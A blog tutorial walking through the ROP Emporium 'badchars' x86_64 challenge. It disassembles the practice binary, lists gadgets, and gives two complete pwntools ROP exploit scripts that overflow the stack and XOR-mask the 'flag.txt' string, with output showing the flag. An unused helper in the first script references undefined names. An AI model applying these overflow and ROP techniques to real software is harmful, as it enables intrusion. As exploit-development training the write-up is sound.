---
Title: Ropemporium x86_64 bad chars
Date: 2023-06-05
Tags: [linux, python, ROP, x86_64, ropemporium]
Categories: [tutorial]
Author: cdpointpoint
Draft: False
---

# bad chars

## Introduction

The challenge is described on the ropemporium site : https://ropemporium.com/challenge/badchars.html
with some useful indications.

### The good, the bad

Dealing with bad characters is frequently necessary in exploit development, you've probably had to deal with them before while encoding shellcode. "Badchars" are the reason that encoders such as shikata-ga-nai exist. When constructing your ROP chain remember that the badchars apply to every character you use, not just parameters but addresses too. To mitigate the need for too much RE the binary will list its badchars when you run it.
Options

ropper has a bad characters option to help you avoid using gadgets whose address will terminate your chain prematurely, it will certainly come in handy. Note that the amount of garbage data you'll need to send to the ARM challenge is slightly different.
Moar XOR

You'll still need to deal with writing a string into memory, similar to the write4 challenge, that may have badchars in it. Once your string is in memory and intact, just use the print_file() method to print the contents of the flag file, just like in the last challenge. Think about how we're going to overcome the badchars issue; should we try to avoid them entirely, or could we use gadgets to change our string once it's in memory?
Helper functions

It's almost certainly worth your time writing a helper function for this challenge. Perhaps one that takes as parameters a string, a desired location in memory and an array of badchars. It could then write the string into memory and deal with the badchars afterwards. There's always a chance you could find a string that does what you want and doesn't contain any badchars either.


## Discovery

Launching the program :

```sh
05_badchars$ ./badchars
badchars by ROP Emporium
x86_64

badchars are: 'x', 'g', 'a', '.'
> AAAAAA
Thank you!
```


## Analyze

The main function call directly the pwnme function

```sh
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000400607 <+0>:	push   rbp
   0x0000000000400608 <+1>:	mov    rbp,rsp
   0x000000000040060b <+4>:	call   0x400500 <pwnme@plt>
   0x0000000000400610 <+9>:	mov    eax,0x0
   0x0000000000400615 <+14>:	pop    rbp
   0x0000000000400616 <+15>:	ret
End of assembler dump.
```

And the pwnme function is imported from libbadchars.so

```sh
The PLT entry :
Dump of assembler code for function pwnme@plt:
   0x0000000000400500 <+0>:	jmp    QWORD PTR [rip+0x200b12]        # 0x601018 <pwnme@got.plt>
   0x0000000000400506 <+6>:	push   0x0
   0x000000000040050b <+11>:	jmp    0x4004f0
End of assembler dump.
```

This time, the pwnme function controle the input with 4 characters forbidden : "xga."

Looking at pwnme with radare2 :

``` sh
[0x00000820]> s sym.pwnme
[0x000008fa]> pdf
┌ 269: sym.pwnme ();
│           ; var ssize_t buf @ rbp-0x40
│           ; var int64_t var_38h @ rbp-0x38
│           ; var int64_t var_30h @ rbp-0x30
│           ; var int64_t var_20h @ rbp-0x20
│           0x000008fa      55             push rbp
│           0x000008fb      4889e5         mov rbp, rsp
│           0x000008fe      4883ec40       sub rsp, 0x40
│           0x00000902      488b05cf0620.  mov rax, qword [reloc.stdout] ; [0x200fd8:8]=0
│           0x00000909      488b00         mov rax, qword [rax]
│           0x0000090c      b900000000     mov ecx, 0                  ; size_t size
│           0x00000911      ba02000000     mov edx, 2                  ; int mode
│           0x00000916      be00000000     mov esi, 0                  ; char *buf
│           0x0000091b      4889c7         mov rdi, rax                ; FILE*stream
│           0x0000091e      e8bdfeffff     call sym.imp.setvbuf        ; int setvbuf(FILE*stream, char *buf, int mode, size_t size)
│           0x00000923      488d3d7a0100.  lea rdi, [0x00000aa4]       ; "badchars by ROP Emporium" ; const char *s
│           0x0000092a      e851feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0000092f      488d3d870100.  lea rdi, str.x86_64_n       ; 0xabd ; "x86_64\n" ; const char *s
│           0x00000936      e845feffff     call sym.imp.puts           ; int puts(const char *s)
│           0x0000093b      488d45c0       lea rax, [buf]
│           0x0000093f      4883c020       add rax, 0x20               ; "@"
│           0x00000943      ba20000000     mov edx, 0x20               ; "@" ; size_t n
│           0x00000948      be00000000     mov esi, 0                  ; int c
│           0x0000094d      4889c7         mov rdi, rax                ; void *s
│           0x00000950      e85bfeffff     call sym.imp.memset         ; void *memset(void *s, int c, size_t n)
│           0x00000955      488d3d6c0100.  lea rdi, str.badchars_are:_x__g__a__. ; 0xac8 ; "badchars are: 'x', 'g', 'a', '.'" ; const char *s
│           0x0000095c      e81ffeffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00000961      488d3d810100.  lea rdi, [0x00000ae9]       ; "> " ; const char *format
│           0x00000968      b800000000     mov eax, 0
│           0x0000096d      e82efeffff     call sym.imp.printf         ; int printf(const char *format)
│           0x00000972      488d45c0       lea rax, [buf]
│           0x00000976      4883c020       add rax, 0x20               ; "@"
│           0x0000097a      ba00020000     mov edx, 0x200              ; size_t nbyte
│           0x0000097f      4889c6         mov rsi, rax                ; void *buf
│           0x00000982      bf00000000     mov edi, 0                  ; int fildes
│           0x00000987      e834feffff     call sym.imp.read           ; ssize_t read(int fildes, void *buf, size_t nbyte)
│           0x0000098c      488945c0       mov qword [buf], rax
│           0x00000990      48c745c80000.  mov qword [var_38h], 0
│       ┌─< 0x00000998      eb51           jmp 0x9eb
│       │   ; CODE XREF from sym.pwnme @ 0x9f6
│      ┌──> 0x0000099a      48c745d00000.  mov qword [var_30h], 0
│     ┌───< 0x000009a2      eb31           jmp 0x9d5
│     │╎│   ; CODE XREF from sym.pwnme @ 0x9dd
│    ┌────> 0x000009a4      488b45c8       mov rax, qword [var_38h]
│    ╎│╎│   0x000009a8      0fb64c05e0     movzx ecx, byte [rbp + rax - 0x20]
│    ╎│╎│   0x000009ad      488b45d0       mov rax, qword [var_30h]
│    ╎│╎│   0x000009b1      488b15280620.  mov rdx, qword [reloc.badcharacters] ; [0x200fe0:8]=0
│    ╎│╎│   0x000009b8      0fb60402       movzx eax, byte [rdx + rax]
│    ╎│╎│   0x000009bc      38c1           cmp cl, al
│   ┌─────< 0x000009be      7509           jne 0x9c9
│   │╎│╎│   0x000009c0      488b45c8       mov rax, qword [var_38h]
│   │╎│╎│   0x000009c4      c64405e0eb     mov byte [rbp + rax - 0x20], 0xeb
│   │╎│╎│   ; CODE XREF from sym.pwnme @ 0x9be
│   └─────> 0x000009c9      488b45d0       mov rax, qword [var_30h]
│    ╎│╎│   0x000009cd      4883c001       add rax, 1
│    ╎│╎│   0x000009d1      488945d0       mov qword [var_30h], rax
│    ╎│╎│   ; CODE XREF from sym.pwnme @ 0x9a2
│    ╎└───> 0x000009d5      488b45d0       mov rax, qword [var_30h]
│    ╎ ╎│   0x000009d9      4883f803       cmp rax, 3
│    └────< 0x000009dd      76c5           jbe 0x9a4
│      ╎│   0x000009df      488b45c8       mov rax, qword [var_38h]
│      ╎│   0x000009e3      4883c001       add rax, 1
│      ╎│   0x000009e7      488945c8       mov qword [var_38h], rax
│      ╎│   ; CODE XREF from sym.pwnme @ 0x998
│      ╎└─> 0x000009eb      488b55c8       mov rdx, qword [var_38h]
│      ╎    0x000009ef      488b45c0       mov rax, qword [buf]
│      ╎    0x000009f3      4839c2         cmp rdx, rax
│      └──< 0x000009f6      72a2           jb 0x99a
│           0x000009f8      488d3ded0000.  lea rdi, str.Thank_you_     ; 0xaec ; "Thank you!" ; const char *s
│           0x000009ff      e87cfdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00000a04      90             nop
│           0x00000a05      c9             leave
└           0x00000a06      c3             ret
[0x000008fa]>
```

The bads characters are :

```
0x7fb56b800aa0 <badcharacters>:	0x78	0x67	0x61	0x2e
```

If one byte is a bad char it is changed by 0xeb

    │    ╎│╎│   0x000009bc      38c1           cmp cl, al
    │   ┌─────< 0x000009be      7509           jne 0x9c9
    │   │╎│╎│   0x000009c0      488b45c8       mov rax, qword [var_38h]
    │   │╎│╎│   0x000009c4      c64405e0eb     mov byte [rbp + rax - 0x20], 0xeb


This time the `print_file`function is not in the `badchars` program but in the library.
But fortunatly, a not called but existing function `usefulFunction` call it and then print_file is refenced in the PLT table.

Elsewhere, without leak we dont have the adresse of print_file in the lib.

```
gef➤  disas usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400617 <+0>:	push   rbp
   0x0000000000400618 <+1>:	mov    rbp,rsp
   0x000000000040061b <+4>:	mov    edi,0x4006c4
   0x0000000000400620 <+9>:	call   0x400510 <print_file@plt>
   0x0000000000400625 <+14>:	nop
   0x0000000000400626 <+15>:	pop    rbp
   0x0000000000400627 <+16>:	ret
End of assembler dump.
```

If we try to apply write4 technic on this program we will obtain :

    badchars by ROP Emporium
    x86_64

    badchars are: 'x', 'g', 'a', '.'
    > Thank you!
    Failed to open file: fl\xeb\xeb\xebt\xebt

(the script is in the end of the post )

Some gadget are suggested to us :

```sh
[0x00400628]>  pd 8
            ;-- usefulGadgets:
            0x00400628      453037         xor byte [r15], r14b
            0x0040062b      c3             ret
            0x0040062c      450037         add byte [r15], r14b
            0x0040062f      c3             ret
            0x00400630      452837         sub byte [r15], r14b
            0x00400633      c3             ret
            0x00400634      4d896500       mov qword [r13], r12
            0x00400638      c3             ret
```

Identifying imported funtion in .plt section.

With r2

```sh
[0x00400520]> iS .plt~plt
10  0x000004a8   0x30 0x004004a8   0x30 -r-- .rela.plt
12  0x000004f0   0x30 0x004004f0   0x30 -r-x .plt
22  0x00001000   0x28 0x00601000   0x28 -rw- .got.plt

[0x00400520]> pd 8 @0x004004f0
            ;-- section..plt:
            ;-- .plt:
            ; CODE XREF from sym.imp.pwnme @ +0xb
            ; CODE XREF from sym.imp.print_file @ +0xb
        ┌─> 0x004004f0      ff35120b2000   push qword [0x00601008]     ; [12] -r-x section size 48 named .plt
        ╎   0x004004f6      ff25140b2000   jmp qword [0x00601010]      ; [0x601010:8]=0
        ╎   0x004004fc      0f1f4000       nop dword [rax]
        ╎   ; CALL XREF from main @ 0x40060b
┌ 6: sym.imp.pwnme ();
│ bp: 0 (vars 0, args 0)
│ sp: 0 (vars 0, args 0)
│ rg: 0 (vars 0, args 0)
└       ╎   0x00400500      ff25120b2000   jmp qword [reloc.pwnme]     ; [0x601018:8]=0x400506
        ╎   0x00400506      6800000000     push 0
        └─< 0x0040050b      e9e0ffffff     jmp sym..plt
            ; CALL XREF from sym.usefulFunction @ 0x400620
┌ 6: sym.imp.print_file ();
│ bp: 0 (vars 0, args 0)
│ sp: 0 (vars 0, args 0)
│ rg: 0 (vars 0, args 0)
└           0x00400510      ff250a0b2000   jmp qword [reloc.print_file] ; [0x601020:8]=0x400516
            0x00400516      6801000000     push 1                      ; 1
```

## Find a writable memory section

```sh
05_badchars# rabin2 -S badchars
[Sections]

nth paddr        size vaddr       vsize perm name
―――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000    0x0 0x00000000    0x0 ----
1   0x00000238   0x1c 0x00400238   0x1c -r-- .interp
2   0x00000254   0x20 0x00400254   0x20 -r-- .note.ABI-tag
3   0x00000274   0x24 0x00400274   0x24 -r-- .note.gnu.build-id
4   0x00000298   0x38 0x00400298   0x38 -r-- .gnu.hash
5   0x000002d0   0xf0 0x004002d0   0xf0 -r-- .dynsym
6   0x000003c0   0x7e 0x004003c0   0x7e -r-- .dynstr
7   0x0000043e   0x14 0x0040043e   0x14 -r-- .gnu.version
8   0x00000458   0x20 0x00400458   0x20 -r-- .gnu.version_r
9   0x00000478   0x30 0x00400478   0x30 -r-- .rela.dyn
10  0x000004a8   0x30 0x004004a8   0x30 -r-- .rela.plt
11  0x000004d8   0x17 0x004004d8   0x17 -r-x .init
12  0x000004f0   0x30 0x004004f0   0x30 -r-x .plt
13  0x00000520  0x192 0x00400520  0x192 -r-x .text
14  0x000006b4    0x9 0x004006b4    0x9 -r-x .fini
15  0x000006c0   0x10 0x004006c0   0x10 -r-- .rodata
16  0x000006d0   0x44 0x004006d0   0x44 -r-- .eh_frame_hdr
17  0x00000718  0x120 0x00400718  0x120 -r-- .eh_frame
18  0x00000df0    0x8 0x00600df0    0x8 -rw- .init_array
19  0x00000df8    0x8 0x00600df8    0x8 -rw- .fini_array
20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- .dynamic
21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- .got
22  0x00001000   0x28 0x00601000   0x28 -rw- .got.plt
23  0x00001028   0x10 0x00601028   0x10 -rw- .data
24  0x00001038    0x0 0x00601038    0x8 -rw- .bss
25  0x00001038   0x29 0x00000000   0x29 ---- .comment
26  0x00001068  0x618 0x00000000  0x618 ---- .symtab
27  0x00001680  0x1f8 0x00000000  0x1f8 ---- .strtab
28  0x00001878  0x103 0x00000000  0x103 ---- .shstrtab
```

We can try .bss : 0x00601038


## Building the attack


As for write4 we can write "flag.txt" in memory en then call print_file

But the 3 forbiddens chars have to be changed.
The classical technic is to submit a message wirh the bad chars xored with a mask and in a second stage xor the data in memory with the same mask



## looking for gadgets :

Of course the gadgets are in the usefulGadgets section but we want maniplate ROPGadget.

First, for write in memory purpose : searching a "mov [rxx], ryy" instruction.
Else we can look for "add", "xor" ...

```sh
05_badchars$ ROPgadget --binary badchars|grep 'mov.*\[r..],'
0x0000000000400635 : mov dword ptr [rbp], esp ; ret
0x0000000000400634 : mov qword ptr [r13], r12 ; ret
```

We need a xor gadget :

```sh
05_badchars# ROPgadget --binary badchars |grep "xor"
0x0000000000400628 : xor byte ptr [r15], r14b ; ret
0x0000000000400629 : xor byte ptr [rdi], dh ; ret
```
We can do that with the "xor byte ptr [r15], r14b ; ret" gadget.
This gadget allow to xor one byte each time, the we will apply it 4 times.

To use it we need to set r14 and r15.

```sh
05_badchars# ROPgadget --binary badchars |grep "pop r14"
0x000000000040069c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040069e : pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006a0 : pop r14 ; pop r15 ; ret
0x000000000040069b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040069f : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040069d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
```
ok with the first gadget we can set r12, r13 to write in memory and r15 and r14 to xor a byte.


### ropchaine synoptic

Because our xor gadget xor only one char a time we wan xor only the needed bytes.

Here xga. must be xored.

flag.txt
00111010

we can make a function xorchain(string, filter, mask) :
xor the bytes selected by a filter (mask of characters to xor) and with a xor mask value.
We choose the xor mask 0b11 (3)

xoredflag = xorchain("flag.txt","00111010", 3)

Return "flag.txt" masked : "flbd-t{t"


write masked file name.
- pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
- xoredflag for r12  write content
- @bss      for r13, write target
- 3         for r14, xor mask 
- @bss+2    for r15, target adresse of char 2
- mov qword ptr [r13], r12 ; ret    : do the initial write

xor of .bss+2
- xor byte ptr [r15], r14b ; ret

xor of .bss+3
- pop r15
- @bss+3
- xor byte ptr [r15], r14b ; ret

xor de .bss+4
- pop r15
- @bss+4
- xor byte ptr [r15], r14b ; ret

xor de .bss+6
- pop r15
- @bss+6
- xor byte ptr [r15], r14b ; ret

call print_file(@bss)
- pop rdi
- @bss
- print_file

## Exploitation

### Python script

Below, the exploitation python script

``` python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time
import sys

# break after read in pwnme
gs='''
b *pwnme+150
c
'''

# Gadgets
# pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
pop_r12345=0x40069c
# 0x00000000004006a2 : pop r15 ; ret
pop_r15 = 0x4006a2
#0x400634 : mov qword ptr [r13], r12 ; ret
write_r13r12=0x400634
# pop rdi ; ret
pop_rdi = 0x4006a3
#0x0000000000400628 : xor byte ptr [r15], r14b ; ret
xor_r15 = 0x400628

def w_write(addr, data):
    r=b""
    if type(data) == str:
        data=data.encode()
    for i in range(0,len(data),8):
        r += p64(pop_r1415)
        r += p64(addr)
        r += data[i:i+8]
        r += p64(write_r14)
    return r


def xorchain(chain, bytes, mask):
    r=b""
    for i,c in enumerate(chain):
        if bytes&0x80:
            c=c^mask
        r+=chr(c).encode()
        bytes= bytes<<1
    return r

# Offset avant ecrasement de l'adresse de retour
offset=0x28

# Set up pwntools for the correct architecture
elf =  ELF('badchars')
context.binary=elf

print_file=elf.plt['print_file']

bss = 0x00601038

flagxored = xorchain(b"flag.txt",0b00111010,3)

PL =b"A"*offset
PL+=p64(pop_r12345)
PL+=flagxored
PL+=p64(bss)
PL+=p64(3)
PL+=p64(bss+2)
PL+=p64(write_r13r12)

PL+=p64(xor_r15)

PL+=p64(pop_r15)
PL+=p64(bss+3)
PL+=p64(xor_r15)

PL+=p64(pop_r15)
PL+=p64(bss+4)
PL+=p64(xor_r15)

PL+=p64(pop_r15)
PL+=p64(bss+6)
PL+=p64(xor_r15)

PL+=p64(pop_rdi)
PL+=p64(bss)
PL+=p64(print_file)

io = process([elf.path])
if len(sys.argv)>1 and sys.argv[1] == "-d":
    gdb.attach(io,gs)
    time.sleep(1)
    #io = gdb.debug([elf.path],gdbscript=gs)

# io.recvuntil(b"> ")
io.sendline(PL)
io.interactive()

```

### Execution

``` sh
05_badchars# python3 solve.py
[*] '/w/ropemporium/x64/05_badchars/badchars'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'.'
[+] Starting local process '/w/ropemporium/x64/05_badchars/badchars': pid 72
[*] Switching to interactive mode
badchars by ROP Emporium
x86_64

badchars are: 'x', 'g', 'a', '.'
> Thank you!
ROPE{a_placeholder_32byte_flag!}
[*] Got EOF while reading in interactive
```

## Annexe

### Python script applying write4 method

``` python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time
import sys

# Attaque naive de badchars avec l'approche de write4
# break apres le read dans pwnme
gs='''
b *pwnme+268
c
'''

# Gadgets
# pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
pop_r12345=0x40069c
# mov qword ptr [r13], r12 ; ret
write_r13r12=0x400634
# pop rdi ; ret
pop_rdi = 0x4006a3

def w_write(addr, data):
    r=b""
    if type(data) == str:
        data=data.encode()
    for i in range(0,len(data),8):
        r += p64(pop_r12345)
        r += data[i:i+8]
        r += p64(addr+i)
        r += p64(0)
        r += p64(0)
        r += p64(write_r13r12)
    return r


def xorchain(chain, bytes, mask):
    r=b""
    for i,c in enumerate(chain):
        if bytes&0x80:
            c=c^mask
        r+=chr(c).encode()
        bytes= bytes<<1
    return r

# Offset avant ecrasement de l'adresse de retour
offset=0x28

# Set up pwntools for the correct architecture
elf =  ELF('badchars')
context.binary=elf

print_file=elf.plt['print_file']

bss = 0x00601038

PL =b"A"*offset
PL+=w_write(bss,"flag.txt")
PL+=p64(pop_rdi)
PL+=p64(bss)
PL+=p64(print_file)

io = process([elf.path])
if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)

# io.recvuntil(b"> ")
io.sendline(PL)
io.interactive()
```